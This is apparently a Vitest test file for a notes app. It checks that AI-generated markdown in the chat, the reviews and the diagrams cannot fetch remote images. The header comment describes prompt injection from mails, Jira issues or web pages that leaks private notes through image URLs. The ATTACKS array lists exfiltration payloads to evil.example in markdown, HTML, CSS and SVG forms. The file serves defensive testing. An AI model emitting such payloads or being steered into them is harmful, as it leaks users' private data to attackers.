// q124 R3C-1: a model's answer must not load anything from another server by itself. An image
// address can carry what the model read (a private note, also on the local model), steered by
// text in a mail, a Jira issue or a web page; the app's CSP allows https images for notes.

import { describe, expect, it } from "vitest";
import { isRemoteUrl, renderAiMarkdown, renderChatMarkdown, renderMarkdown, svgWithoutRemoteLoads } from "./markdown";
import { cleanAiMarkdown, withoutRemoteImages } from "./aitext";

const LEAK = "https://evil.example/p.png?d=Gehalt%205000";

/** Every address in `html` that the browser would fetch by itself. */
function loads(html: string): string[] {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
  const out: string[] = [];
  for (const el of doc.body.querySelectorAll("*")) {
    for (const a of ["src", "srcset", "poster", "background", "data", "xlink:href"]) {
      const v = el.getAttribute(a);
      if (v) out.push(v);
    }
    if (el.localName !== "a" && el.getAttribute("href")) out.push(el.getAttribute("href")!);
    const style = el.getAttribute("style") ?? (el.localName === "style" ? el.textContent : null);
    if (style && /url\s*\(/i.test(style)) out.push(style);
  }
  return out.filter((u) => /url\s*\(/i.test(u) || isRemoteUrl(u.split(/\s/)[0]));
}

const ATTACKS = [
  `Zusammenfassung.\n\n![Logo](${LEAK})`,
  `Text ![](${LEAK} "t") mehr`,
  `Antwort:\n\n<img src="${LEAK}" alt="x">`,
  `Antwort:\n\n<img srcset="${LEAK} 2x" src="data:image/png;base64,AA==">`,
  `Antwort:\n\n<p style="background:url(${LEAK})">x</p>`,
  `Antwort:\n\n<style>body{background:url(${LEAK})}</style>`,
  `Antwort:\n\n<video poster="${LEAK}"></video>`,
  `Antwort:\n\n<svg><image href="${LEAK}"></image></svg>`,
  `Antwort:\n\n<picture><source srcset="${LEAK}"><img src="${LEAK}"></picture>`,
  `Antwort:\n\n![x](//evil.example/a.png)`,
];

describe("answers of a model load nothing from other servers", () => {
  it("the chat, the reviews, the briefing and the inline AI bar", () => {
    for (const md of ATTACKS) {
      expect(loads(renderChatMarkdown(md)), `chat: ${md}`).toEqual([]);
      expect(loads(renderAiMarkdown(md)), `review: ${md}`).toEqual([]);
    }
    // The plain renderer of notes (the user's own images) is unchanged.
    expect(loads(renderMarkdown(`Notiz:\n\n![Logo](${LEAK})`))).toEqual([LEAK]);
  });

  it("a remote image becomes a link with its address, opened only by a click", () => {
    const root = document.createElement("div");
    root.innerHTML = renderChatMarkdown(`Antwort:\n\n![Diagramm](${LEAK})`);
    const a = root.querySelector<HTMLAnchorElement>("a.ai-remote-image");
    expect(a?.getAttribute("href")).toBe(LEAK);
    expect(a?.hasAttribute("data-external")).toBe(true);
    expect(a?.textContent).toBe("Diagramm");
    expect(root.querySelector("img")).toBeNull();
    // Inline data and the app's own attachments still show.
    root.innerHTML = renderAiMarkdown("Bild:\n\n![[foto.png]]\n\n![d](data:image/png;base64,AA==)");
    expect(root.querySelectorAll("img").length).toBe(2);
    // Links stay links.
    root.innerHTML = renderChatMarkdown("Siehe [Doku](https://example.com/doku).");
    expect(root.querySelector("a")?.getAttribute("href")).toBe("https://example.com/doku");
  });

  it("a diagram of an answer loses its remote images", () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><style>.a{fill:url(${LEAK})}</style><g><image href="${LEAK}" xlink:href="${LEAK}"></image><rect width="1" height="1"></rect></g></svg>`;
    const out = svgWithoutRemoteLoads(svg);
    expect(loads(out)).toEqual([]);
    expect(out).toContain("<rect");
  });

  it("an answer put into a page carries no remote image", () => {
    expect(withoutRemoteImages(`A ![Logo](${LEAK}) B`)).toBe(`A [Logo](<${LEAK}>) B`);
    expect(withoutRemoteImages(`![](${LEAK})`)).toBe(`[${LEAK}](<${LEAK}>)`);
    // Every form the page shows as an image: nested brackets, references, <image> (read as <img>), in lists and tables.
    const forms = `![[a]](${LEAK})\n\n- ![x][1] und ![y]\n\n| a |\n| - |\n| ![t](${LEAK}) |\n\n<image src="${LEAK}">\n\n[1]: ${LEAK}\n[Y]: <${LEAK}>`;
    expect(renderMarkdown(withoutRemoteImages(forms))).not.toMatch(/<img/);
    expect(renderMarkdown(forms)).toMatch(/<img/);
    expect(withoutRemoteImages(`<img alt="Logo" src="${LEAK}">`)).toBe(`[Logo](<${LEAK.replace(/ /g, "%20")}>)`);
    // Code, attachments and inline data stay as they are.
    const kept = "```md\n![x](https://example.com/a.png)\n```\n\n`![y](https://example.com/b.png)`\n\n![[foto.png]] ![z](data:image/png;base64,AA==) ![w](bild.png)";
    expect(withoutRemoteImages(kept)).toBe(kept);
    // The inline AI bar, the reviews and the meeting summary insert what `cleanAiMarkdown` gives.
    expect(cleanAiMarkdown("```markdown\n# T\n\n![a](https://evil.example/x.png)\n```")).toBe("# T\n\n[a](<https://evil.example/x.png>)");
    expect(renderMarkdown(withoutRemoteImages(`![a](${LEAK})`))).not.toContain("<img");
  });
});
